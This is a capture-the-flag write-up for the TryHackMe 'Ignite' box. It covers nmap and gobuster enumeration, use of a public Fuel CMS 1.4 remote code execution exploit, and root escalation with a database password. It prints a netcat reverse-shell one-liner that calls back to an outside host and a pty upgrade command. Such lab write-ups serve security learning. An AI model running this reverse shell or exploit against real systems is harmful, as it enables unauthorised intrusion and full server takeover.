# Ignite CTF Tryhackme

## Step 1. Enumerate with Nmap

To begin my reconnaissance on the target machine, I started by checking for any open ports using Nmap. 
Specifically, I ran the following command: `nmap -sV <MACHINE_IP>` This scan helped me identify any active services 
running on the machine and their respective versions. Below are the results of the scan:

![Screenshot 2025-03-09 212845](https://github.com/user-attachments/assets/308262d2-5667-462a-99cd-ccc9326b9f74)

From the output, it appears that only port 80 (HTTP) is open, which means we can rule out a wide range of potential 
exploits related to other services, such as SSH, FTP, or SMB. Since HTTP is accessible, our next logical step is to explore the 
web server to see if we can uncover any hidden directories or files that might contain sensitive information or vulnerabilities.

To accomplish this, I used Gobuster, a tool designed for brute-forcing directories and files on web servers. Nothing that interesting was found as shown below:
![Screenshot 2025-03-09 213549](https://github.com/user-attachments/assets/2ca2f0d1-10c3-47e2-aee8-d4687625379d)

Finally going to the IP itself brought me to a page that had said "Welcome to Fuel CMS Version 1.4." This brings us to the next step.

## Step 2. Finding and using an Exploit

Fuel CMS V1.4 gave a huge clue to what the vulnerability we actually needed to exploit was, I did some googling around and found a Fuel CMS RCE (Remote Code Execution)
exploit on github I could use to gain access to the server. 

Access to the exploit is here -> https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE

After using Git Clone I was able to use the console.py file provided by the creator of this exploit which immediately launched a reverse shell onto the webserver
(No wonder this has a CVSS of 9.8)

![Screenshot 2025-03-09 214604](https://github.com/user-attachments/assets/e89261c3-1605-47b1-bb57-3faa9ed13548)


## Step 3. User Flag

Finding the user flag was pretty simple, the harder part is going to be getting the root flag. I did `locate userflag.txt` and a few other variations until I did
`locate flag.txt` when I finally found a match in /home/www-data/flag.txt. In the shell, you can type download in the directory you want and it will download that directory 
to the host system. From there I was able to read flag.txt

![Screenshot 2025-03-10 202056](https://github.com/user-attachments/assets/efff0089-6fa2-4b9c-a611-06547d104d42)

## Step 4. Escalate Privlages. 

Doing a quick search of Fuel CMS I came across the github and was able to find the file path to databse.php, which could potentially hold some interesting data. 

I downloaded /var/www/html/fuel/application/config/database.php onto my linux machine to further investigate and it looks like we found a username and a
password to the server

![Screenshot 2025-03-10 202814](https://github.com/user-attachments/assets/88b9def9-145c-4814-8d18-81874627730a)

I had a little bit of a tough time getting to switch users. Apparently, I didn't actually have a terminal. To fix this. all
I had to do was just start a reverse shell using  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` and also use a netcat listener on the host system to get a terminal.

Now that I have terminal on the web server I did `python -c 'import pty;pty.spawn("/bin/bash")'`. I did this so I could switch to the root user using su root with the
password of "mememe" we found earlier in database.php.


![Screenshot 2025-03-10 204940](https://github.com/user-attachments/assets/5d646308-77f2-4b97-b174-d32b8a724c4f)

Now that I became the root user I simply changed directories into root and then read root.txt! 
